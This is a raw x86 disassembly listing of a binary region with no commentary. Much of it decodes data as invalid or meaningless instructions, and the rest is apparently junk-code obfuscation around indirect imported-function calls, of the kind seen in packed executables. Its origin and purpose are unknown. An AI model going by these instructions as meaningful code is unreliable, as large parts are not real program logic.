  41ee72:	fbld   TBYTE PTR [edx-0x53]
  41ee75:	lods   al,BYTE PTR ds:[esi]
  41ee76:	inc    esp
  41ee77:	mov    bl,0x5a
  41ee79:	addr16 call 0x5a4012dd
  41ee7f:	push   edi
  41ee80:	inc    ebp
  41ee81:	imul   ebp,DWORD PTR [eax-0x6478faf8],0x6f0c1a0e
  41ee8b:	cmp    DWORD PTR [edx-0x29],ecx
  41ee8e:	mov    bh,cl
  41ee90:	std    
  41ee91:	cmp    cl,ch
  41ee93:	or     DWORD PTR [edi+0x8],eax
  41ee96:	out    0xd1,eax
  41ee98:	iret   
  41ee99:	mov    edx,0x46dd68ef
  41ee9e:	or     DWORD PTR [edi],ebx
  41eea0:	arpl   WORD PTR ds:0x1ca0e66d,cx
  41eea6:	mov    ecx,0x14da0fdb
  41eeab:	dec    ebp
  41eeac:	(bad)  
  41eead:	loope  0x41eef3
  41eeaf:	(bad)  [ebx]
  41eeb1:	jns    0x41eeb1
  41eeb3:	pop    eax
  41eeb4:	lahf   
  41eeb5:	inc    ecx
  41eeb6:	dec    eax
  41eeb7:	sar    BYTE PTR [edx-0x2952af09],1
  41eebd:	fs loopne 0x41eee1
  41eec0:	int    0x4f
  41eec2:	nop
  41eec3:	or     DWORD PTR ds:0xacb5576a,0xb1f6ca31
  41eecd:	vmread DWORD PTR [ebp-0x64],esi
  41eed1:	inc    esp
  41eed2:	push   edi
  41eed3:	pusha  
  41eed4:	jns    0x41ef25
  41eed6:	adc    esp,edi
  41eed8:	inc    eax
  41eed9:	dec    edx
  41eeda:	mov    es,WORD PTR [esp+ebx*2-0x41]
  41eede:	loope  0x41ee83
  41eee0:	call   0xc43d84b8
  41eee5:	mov    dl,0xaf
  41eee7:	add    al,0x76
  41eee9:	iret   
  41eeea:	pop    DWORD PTR [ebx+0x3f323411]
  41eef0:	dec    esp
  41eef1:	cwde   
  41eef2:	adc    BYTE PTR [ecx*4+0x7118fde4],0xbd
  41eefa:	into   
  41eefb:	leave  
  41eefc:	sub    DWORD PTR [edx],ebx
  41eefe:	cwde   
  41eeff:	mov    edi,0x325c2c79
  41ef04:	cld    
  41ef05:	jne    0x41eeb7
  41ef07:	jb     0x41eeaa
  41ef09:	mov    cs,WORD PTR [ebp+0x3]
  41ef0c:	data16 mov cl,0x83
  41ef0f:	hlt    
  41ef10:	dec    esp
  41ef11:	cmp    al,0x1c
  41ef13:	cmp    eax,0xed1c9c26
  41ef18:	push   esi
  41ef19:	mov    ebx,0xaf44fff2
  41ef1e:	aad    0xe9
  41ef20:	xor    BYTE PTR [ebx-0x6b],ch
  41ef23:	frstor [esi*4+0x6fc9fde]
  41ef2a:	mov    ch,0x7
  41ef2c:	xchg   BYTE PTR [edi-0x62022706],bh
  41ef32:	imul   esp,ebx,0x27
  41ef35:	popf   
  41ef36:	test   al,0x30
  41ef38:	inc    ebp
  41ef39:	sbb    BYTE PTR [esi+0x67],0xd7
  41ef3d:	dec    edx
  41ef3e:	pop    ebx
  41ef3f:	jecxz  0x41ef70
  41ef41:	fld    DWORD PTR [edx]
  41ef43:	cwde   
  41ef44:	or     al,0xac
  41ef46:	xor    al,0x3d
  41ef48:	pop    ecx
  41ef49:	lods   eax,DWORD PTR ds:[esi]
  41ef4a:	dec    ebx
  41ef4b:	bound  esp,QWORD PTR [esi+ebp*1]
  41ef4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41ef51:	adc    DWORD PTR ds:0x42816f,0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428293
  41ef7a:	sbb    DWORD PTR ds:0x42816f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428187,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282fb,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282eb,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282fb,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e1c
  41efd7:	sub    edx,DWORD PTR ds:0x42822f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42824b
  41efe4:	mov    DWORD PTR ds:0x428393,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42823b
  41eff4:	xor    edx,DWORD PTR ds:0x4282a7
  41effa:	and    DWORD PTR ds:0x4283a7,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x7f325db0
  41f021:	mov    al,0x99
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx+0x70181812],ah
  41f02b:	jae    0x41efe4
  41f02d:	das    
  41f02e:	push   edi
  41f02f:	xchg   ebx,eax
  41f030:	(bad)  
  41f031:	loopne 0x41f013
  41f033:	cmp    esp,edx
  41f035:	pop    es
  41f036:	adc    al,0x7c
  41f038:	fidiv  DWORD PTR [edi]
  41f03a:	test   al,0xef
  41f03c:	dec    DWORD PTR [edi+0x2dee339]
  41f042:	xor    al,0xc2
  41f044:	mov    cl,0xed
  41f046:	cmp    BYTE PTR [ebx],dl
  41f048:	xchg   esp,eax
  41f049:	push   edi
  41f04a:	mov    ebp,0x8a66d927
  41f04f:	fcomp  QWORD PTR [eax-0x51f6df32]
  41f055:	mov    ebx,DWORD PTR [ebp-0x5]
  41f058:	not    cl
  41f05a:	sub    BYTE PTR fs:[ebx],dl
  41f05d:	inc    eax
  41f05e:	mov    bl,0x5c
  41f060:	enter  0x87f2,0xf9
  41f064:	sbb    eax,0x3f5a8b9b
  41f069:	cwde   
  41f06a:	jl     0x41f0a2
  41f06c:	adc    cl,BYTE PTR [ecx-0x31e2be64]
  41f072:	sub    BYTE PTR [ecx],dh
  41f074:	or     BYTE PTR [ecx],al
  41f076:	std    
  41f077:	lds    ebp,FWORD PTR [ebx-0x31]
  41f07a:	push   es
  41f07b:	loope  0x41f017
  41f07d:	add    edx,DWORD PTR [edx]
  41f07f:	inc    ebp
  41f080:	ret    0x7219
  41f083:	or     BYTE PTR ds:0x6589deee,cl
  41f089:	ins    BYTE PTR es:[edi],dx
  41f08a:	cld    
  41f08b:	mov    dl,0x8e
  41f08d:	imul   edx,ebx,0xc015f014
  41f093:	fsub   QWORD PTR [edi+0x5e5f9654]
  41f099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f09a:	push   ebp
  41f09b:	out    dx,eax
  41f09c:	mov    ds:0x288e2759,al
  41f0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0a2:	adc    BYTE PTR [ecx+0x43a9f9da],ah
  41f0a8:	sbb    eax,esp
  41f0aa:	int    0x1d
  41f0ac:	call   0x1e815ee3
  41f0b1:	push   0x502d5fa9
  41f0b6:	loop   0x41f0f0
  41f0b8:	test   DWORD PTR [edx-0x5a],0xab6c73d4
  41f0bf:	ret    
  41f0c0:	sti    
  41f0c1:	or     al,0x86
  41f0c3:	std    
  41f0c4:	pop    es
  41f0c5:	fnsave [edx-0x1a]
  41f0c8:	push   esi
  41f0c9:	mov    edi,0x63938777
  41f0ce:	es mov ebx,0xc9465e8
  41f0d4:	aas    
  41f0d5:	aaa    
  41f0d6:	xchg   edx,eax
  41f0d7:	pop    edx
  41f0d8:	and    ah,BYTE PTR [ebp+eax*4+0x21dd5add]
  41f0df:	and    edi,esp
  41f0e1:	in     al,0xfc
  41f0e3:	cmp    DWORD PTR [ebx+0x17],0x32
  41f0e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0e8:	mov    bh,0x65
  41f0ea:	(bad)  
  41f0eb:	xlat   BYTE PTR ds:[ebx]
  41f0ec:	shl    DWORD PTR [edi],cl
  41f0ee:	jne    0x41f168
  41f0f0:	fsubr  QWORD PTR ds:0xf83e768a
  41f0f6:	sub    ebx,ebx
  41f0f8:	fdiv   QWORD PTR [eax-0x1aeb7c53]
  41f0fe:	mov    ecx,0xc0993300
  41f103:	and    eax,0xc6459df0
  41f108:	jge    0x41f104
  41f10a:	int3   
  41f10b:	and    al,0xee
  41f10d:	gs inc ecx
  41f10f:	cmp    DWORD PTR [ebx],esi
  41f111:	push   ds
  41f112:	jnp    0x41f0b2
  41f114:	cli    
  41f115:	ss jecxz 0x41f145
  41f118:	(bad)  
  41f11a:	clc    
  41f11b:	call   0xa799b1a7
  41f120:	add    bh,ah
  41f122:	xchg   BYTE PTR [eax],cl
  41f124:	scas   eax,DWORD PTR es:[edi]
  41f125:	dec    ebp
  41f126:	xlat   BYTE PTR ds:[ebx]
  41f127:	lock and esp,DWORD PTR [esi+0x40eb8015]
  41f12e:	call   0x9b1faaf3
  41f133:	cmp    al,BYTE PTR [esi-0x4433e473]
  41f139:	loopne 0x41f0ec
  41f13b:	add    BYTE PTR [esi+0x39423729],dl
  41f141:	sub    edi,0xa6142e1
  41f147:	addr16 cmp eax,0x25deeada
  41f14d:	hlt    
  41f14e:	mov    edi,DWORD PTR [ebp+esi*2+0x57]
  41f152:	(bad)  
  41f153:	in     al,dx
  41f154:	sub    BYTE PTR [edi+0x50c3b31c],dh
  41f15a:	iret   
  41f15b:	pop    ds
  41f15c:	mov    esp,DWORD PTR [ebx]
  41f15e:	lea    edx,[esi+0x5f]
  41f161:	(bad)  
  41f162:	scas   al,BYTE PTR es:[edi]
  41f163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f164:	call   DWORD PTR [ebp+0x6f91be79]
  41f16a:	test   BYTE PTR [ecx-0x80],ch
  41f16d:	pop    edx
  41f16e:	or     ebp,ecx
  41f170:	sub    DWORD PTR ss:[edx+0x8],eax
  41f174:	dec    eax
  41f175:	ror    BYTE PTR [esi+0x313d6e04],0x41
  41f17c:	rcr    BYTE PTR [eax],0x15
  41f17f:	jge    0x41f196
  41f181:	(bad)  
  41f182:	mov    DWORD PTR [edi],esi
  41f184:	mov    dh,0x1b
  41f186:	mov    esi,0x606fd72c
  41f18b:	mov    bl,0x4e
  41f18d:	popa   
  41f18e:	mov    esp,0x4c3e2955
  41f193:	jb     0x41f124
  41f195:	jmp    0x56ad:0x73c2915d
  41f19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f19d:	ds out 0xe6,eax
  41f1a0:	add    al,0x8d
  41f1a2:	cwde   
  41f1a3:	addr16 and al,0x6e
  41f1a6:	bound  ebx,QWORD PTR [ebp-0x5a1d3ac7]
  41f1ac:	es pop edx
  41f1ae:	sbb    DWORD PTR [edi+0x2e9b76a1],edx
  41f1b4:	or     bl,dh
  41f1b6:	dec    ebx
  41f1b7:	cs hlt 
  41f1b9:	cmp    edx,DWORD PTR [edi]
  41f1bb:	pop    ebp
  41f1bc:	jl     0x41f1dc
  41f1be:	neg    DWORD PTR [eax+ebp*2-0x3]
  41f1c2:	inc    esp
  41f1c3:	mov    edx,0x6da5e0b4
  41f1c8:	sub    esp,DWORD PTR [esi-0x6c]
  41f1cb:	ja     0x41f1ba
  41f1cd:	and    BYTE PTR ds:0x2e16c52f,bh
  41f1d3:	or     BYTE PTR [ebp+0x7c689bf1],0xd1
  41f1da:	stos   DWORD PTR es:[edi],eax
  41f1db:	jmp    0x217f0c89
  41f1e0:	add    ebp,DWORD PTR [edx+edx*8-0x10]
  41f1e4:	sbb    BYTE PTR [ecx],dh
  41f1e6:	mov    esp,0x1efa06e1
  41f1eb:	inc    esi
  41f1ec:	ins    DWORD PTR es:[edi],dx
  41f1ed:	jecxz  0x41f24a
  41f1ef:	xor    DWORD PTR [ebx+0x1b5c945b],esp
  41f1f5:	ret    
  41f1f6:	dec    ebp
  41f1f7:	push   esp
  41f1f8:	xor    DWORD PTR [eax-0x46],esp
  41f1fb:	push   ebx
  41f1fc:	jae    0x41f201
  41f1fe:	in     eax,0x63
  41f200:	jle    0x41f1e6
  41f202:	mov    edi,0xa0c60180
  41f207:	das    
  41f208:	call   0x3ec1a742
  41f20d:	pop    es
  41f20e:	shr    DWORD PTR [ecx],0xd7
  41f211:	xor    BYTE PTR [ecx+0x2d],ch
  41f214:	mov    esi,ebx
  41f216:	jno    0x41f27d
  41f218:	(bad)  
  41f219:	rcr    BYTE PTR [eax],cl
  41f21b:	ja     0x41f1e2
  41f21d:	popf   
  41f21e:	xor    DWORD PTR [edi],0xffffffd3
  41f221:	jg     0x41f1c9
  41f223:	nop
  41f224:	mov    DWORD PTR [edx+0x72f8433f],esi
  41f22a:	ins    BYTE PTR es:[edi],dx
  41f22b:	add    eax,0x7a08bd24
  41f230:	repnz sub DWORD PTR [edi],eax
  41f233:	div    BYTE PTR [eax-0xc]
  41f236:	dec    eax
  41f237:	daa    
  41f238:	iret   
  41f239:	jb     0x41f232
  41f23b:	into   
  41f23c:	cwde   
  41f23d:	ds push ebp
  41f23f:	and    al,0xf3
  41f241:	jecxz  0x41f1e0
  41f243:	mov    dh,0x89
  41f245:	imul   ebp,DWORD PTR [ecx+0x79d6088d],0xfffffffd
  41f24c:	mov    al,0x4d
  41f24e:	dec    edx
  41f24f:	mov    ecx,0x31ca2b44
  41f254:	test   DWORD PTR [ecx+0x58c803ad],ecx
  41f25a:	dec    esp
  41f25c:	inc    edx
  41f25d:	data16 fsub st(5),st
  41f260:	ins    DWORD PTR es:[edi],dx
  41f261:	mov    dh,0xc6
  41f263:	(bad)  
  41f264:	icebp  
  41f265:	xchg   al,dh
  41f267:	push   eax
  41f268:	out    dx,eax
  41f269:	dec    esi
  41f26a:	add    ch,dl
  41f26c:	and    DWORD PTR [edi-0x57],ebp
  41f26f:	stos   DWORD PTR es:[edi],eax
  41f270:	adc    esi,DWORD PTR [esi-0x2a]
  41f273:	fldenv [esi+0x56ac5a14]
  41f279:	push   0xffffffa1
  41f27b:	test   eax,0xea148b0d
  41f280:	add    BYTE PTR [ecx],0xb5
  41f283:	fs icebp 
  41f285:	push   0xffffffc9
  41f287:	xor    dh,dl
  41f289:	mov    esp,0x5b091235
  41f28e:	jl     0x41f281
  41f290:	out    dx,eax
  41f291:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41f293:	pop    edi
  41f294:	push   DWORD PTR [edx]
  41f296:	push   0xfffffff0
  41f298:	inc    ebx
  41f299:	int3   
  41f29a:	push   0x5a8ddc82
  41f29f:	arpl   WORD PTR [ebx+eiz*4-0x40],bx
  41f2a3:	pop    es
  41f2a4:	mov    cl,0x24
  41f2a6:	pop    esp
  41f2a7:	fistp  QWORD PTR [ecx+0x30369556]
  41f2ad:	jo     0x41f2ea
  41f2af:	sub    BYTE PTR [eax],ah
  41f2b1:	push   ds
  41f2b2:	addr16 mov ebx,0xe99193d4
  41f2b8:	popa   
  41f2b9:	loop   0x41f307
  41f2bb:	sbb    ecx,esp
  41f2bd:	out    0x24,al
  41f2bf:	test   BYTE PTR [ebp-0x1f018a5f],ah
  41f2c5:	mov    esi,0x4b554ae
  41f2ca:	clc    
  41f2cb:	dec    edi
  41f2cc:	push   eax
  41f2cd:	cmp    al,0xa5
  41f2cf:	ja     0x41f33f
  41f2d1:	jg     0x41f271
  41f2d3:	lods   eax,DWORD PTR ds:[esi]
  41f2d4:	or     bh,BYTE PTR [ebp-0x39]
  41f2d7:	leave  
  41f2d8:	imul   ecx,DWORD PTR [edi-0x48],0xffffffad
  41f2dc:	add    bh,bh
  41f2de:	in     eax,dx
  41f2df:	sub    ecx,DWORD PTR [eax+0x3e]
  41f2e2:	mov    cl,0x5f
  41f2e4:	mov    BYTE PTR [eax-0x75],ah
  41f2e7:	dec    ecx
  41f2e8:	dec    ebx
  41f2e9:	mov    sp,0xd7e2
  41f2ed:	pusha  
  41f2ee:	pop    edi
  41f2ef:	(bad)  
  41f2f0:	xchg   ebp,eax
  41f2f1:	adc    al,0xf8
  41f2f3:	xor    al,0x43
  41f2f5:	mov    ds:0x516d4819,al
  41f2fa:	pop    esp
  41f2fb:	ins    BYTE PTR es:[edi],dx
  41f2fc:	dec    ebx
  41f2fd:	push   edx
  41f2fe:	std    
  41f2ff:	inc    esi
  41f300:	xlat   BYTE PTR ss:[ebx]
  41f302:	inc    edx
  41f303:	ins    DWORD PTR es:[edi],dx
  41f304:	in     eax,dx
  41f305:	shl    BYTE PTR [ebx],1
  41f307:	out    dx,al
  41f308:	pop    edx
  41f309:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f30b:	call   0x5f582690
  41f310:	mov    edx,0x456f4b96
  41f315:	repz pop esp
  41f317:	pop    ebx
  41f318:	sub    eax,0x62abb377
  41f31d:	pop    ebx
  41f31e:	daa    
  41f31f:	ins    DWORD PTR es:[edi],dx
  41f320:	mov    dh,0x92
  41f322:	add    BYTE PTR [esi+0x27],al
  41f325:	lds    edi,FWORD PTR [eax+ebx*8-0x77]
  41f329:	lock xchg edi,eax
  41f32b:	jnp    0x41f2fa
  41f32d:	cmp    al,0x4e
  41f32f:	mov    ch,0x77
  41f331:	lods   al,BYTE PTR ds:[esi]
  41f332:	or     al,0xf1
  41f334:	adc    BYTE PTR [edi+ebp*8+0x37db4993],bl
  41f33b:	mov    ch,0x3c
  41f33d:	pop    es
  41f33e:	jecxz  0x41f35c
  41f340:	sti    
  41f341:	test   eax,0xedfa5410
  41f346:	call   0x6b74:0x7efc0a9f
  41f34d:	mov    esi,0xa5fcf7e3
  41f352:	push   ss
  41f353:	in     al,0x13
  41f355:	pop    ebx
  41f356:	imul   ebp,DWORD PTR [edx+0x25b5520a],0x55b35511
  41f360:	mov    eax,0x6374cc0d
  41f365:	pop    ss
  41f366:	sar    DWORD PTR [ecx+edx*2],cl
  41f369:	mov    DWORD PTR [ebp-0x70],0x6f89
  41f370:	cmp    DWORD PTR ds:0x428313,0x0
  41f377:	movzx  edx,WORD PTR ds:0x42822f
  41f37e:	mov    ecx,DWORD PTR ds:0x428277
  41f384:	mov    ecx,DWORD PTR ds:0x428263
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42824f,ebx
  41f397:	cmp    DWORD PTR ds:0x428313,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428123
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e20
  41f3c7:	sub    ecx,DWORD PTR ds:0x428247
  41f3cd:	mov    DWORD PTR ds:0x428197,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282f3,ebx
  41f3dd:	or     DWORD PTR ds:0x42830b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42819f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428327,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42817f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42838b,0x0
  41f428:	mov    DWORD PTR ds:0x42831f,0xae0
  41f432:	mov    DWORD PTR ds:0x42815b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42837b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428303,ebx
  41f449:	mov    DWORD PTR ds:0x42817f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42838b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f35
  41f468:	call   DWORD PTR ds:0x428ea4
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428397
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428197,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282ef,0x6486
  41f49d:	mov    DWORD PTR ds:0x42825b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42828b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428393,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428197,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427ffb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e24
  41f4d7:	neg    DWORD PTR ds:0x42818b
  41f4dd:	and    DWORD PTR ds:0x42826f,0x4282f3
  41f4e7:	and    DWORD PTR ds:0x42836f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428187
  41f4f4:	sbb    edx,DWORD PTR ds:0x42830f
  41f4fa:	mov    DWORD PTR ds:0x428187,edx
  41f500:	sub    DWORD PTR ds:0x428283,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42818f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428393,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428173,0x0
  41f53b:	mov    DWORD PTR ds:0x42838f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42824f,0x6044
  41f55b:	not    DWORD PTR ds:0x42825b
  41f561:	cmp    DWORD PTR ds:0x428173,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e28
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428153,edi
  41f5a3:	and    DWORD PTR ds:0x4282eb,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428303
  41f5b0:	add    edx,DWORD PTR ds:0x4282fb
  41f5b6:	mov    DWORD PTR ds:0x428303,edx
  41f5bc:	add    DWORD PTR ds:0x4282f7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42825b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42838f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42819b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42831f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42830f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428393,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428257,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42826b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428287,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428253
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42829f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42826b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e2c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42822b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282f7
  41f67a:	add    DWORD PTR ds:0x42831b,ecx
  41f680:	sbb    DWORD PTR ds:0x42828f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428163
  41f68c:	adc    DWORD PTR ds:0x428157,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x4283bf
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42824f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428323,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428307,0x0
  41f6e5:	mov    DWORD PTR ds:0x42830f,0x6375
  41f6ef:	not    DWORD PTR ds:0x42816f
  41f6f5:	mov    DWORD PTR ds:0x42822b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42823b,0x2351
  41f70a:	mov    DWORD PTR ds:0x42827f,ebx
  41f710:	cmp    DWORD PTR ds:0x428307,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42826b
  41f727:	call   DWORD PTR ds:0x428e30
  41f72d:	movzx  ecx,WORD PTR ds:0x42823b
  41f734:	xor    DWORD PTR ds:0x4283a7,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42826b
  41f740:	add    ecx,DWORD PTR ds:0x428263
  41f746:	mov    DWORD PTR ds:0x42826b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42827b
  41f752:	adc    DWORD PTR ds:0x42838b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428327,ebx
  41f75f:	sub    DWORD PTR ds:0x428187,edx
  41f765:	and    DWORD PTR ds:0x428307,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42831b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428387,0x4282fb
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428237,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428247
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42823b,0x428197
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428387,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428287
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428393,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428377
  41f7d9:	mov    DWORD PTR ds:0x42836b,ecx
  41f7df:	mov    DWORD PTR ds:0x42830f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42828f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428187,edi
  41f7fe:	cmp    DWORD PTR ds:0x428393,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f7a
  41f813:	push   0x427ee1
  41f818:	call   DWORD PTR ds:0x428ea8
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x4283bb
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428277,ecx
  41f830:	adc    DWORD PTR ds:0x42815f,edi
  41f836:	and    DWORD PTR ds:0x42839f,0x3101
  41f840:	mov    DWORD PTR ds:0x4283a7,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42816f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42825f
  41f857:	mov    DWORD PTR ds:0x42824b,0x4504
  41f861:	mov    DWORD PTR ds:0x42837f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x4283a3
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42830f,ebx
  41f87c:	cmp    DWORD PTR ds:0x42816f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427fac
  41f890:	push   0x427fb6
  41f895:	call   DWORD PTR ds:0x428eac
  41f89b:	and    DWORD PTR ds:0x428187,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42830f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x4283a3
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428177,0x6c90
